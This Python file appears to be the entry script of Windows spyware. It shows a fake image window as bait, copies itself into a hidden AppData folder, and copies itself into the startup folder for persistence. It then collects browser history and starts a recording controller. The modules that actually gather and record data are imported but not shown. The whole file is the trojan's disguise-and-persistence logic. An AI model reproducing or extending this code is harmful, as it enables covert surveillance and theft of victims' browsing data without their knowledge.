import subprocess

import browserDataGatherer
import fakeWindow
import os
import shutil
from sys import executable
import controller, properties, fileManager

# Getting information about surroundings
curPath = os.getcwd()
# executable name
exeName = executable.split("\\")[-1]
# create a file path for frozen version of this script
appPath = curPath + '\\' + exeName
# create a path for destination folder
dest = os.path.join(properties.APPDATA_PATH, properties.HIDDEN_API_DIR)
# create 2 destination file names
destFileName = dest + '\\' + exeName



def main():
    if os.path.exists(destFileName): # started before?
        # Record if api run for first time from outside
        with open(os.path.join(dest, "first"),"r+") as status_file:
            running_first_time = False
            if int(status_file.read()) == 1:
                running_first_time = True
            status_file.seek(0,0)
            status_file.truncate()
            status_file.write("231232")

        # Start recording now?
        if "status" in curPath or running_first_time:
            print("Starting from appdata!")
            # We are at home!
            controller.start_recording()
        else:
            # Starting from outside and appdata already exist
            # Pretend to be just normal image
            fakeWindow.show_itself()
            return
    else:
        # Running for first time
        print("Starting from unknown location")
        # Bait!
        fakeWindow.show_itself()

        # Moving to appdata
        fileManager.make_road(dest)
        shutil.copy(appPath, dest)
        # copy to startup folder
        print("Setting to startup")
        shutil.copy(destFileName, properties.STARTUP_PATH)
        # obtain history
        browserDataGatherer.gather_data()

        # Record it run for first time and tell appdata copy to run normally
        with open(os.path.join(dest, "first"),"w") as status_file:
            status_file.write("1")

        # Api ends and starts its appdata copy
        subprocess.call([destFileName])


if __name__ == "__main__":
    main()
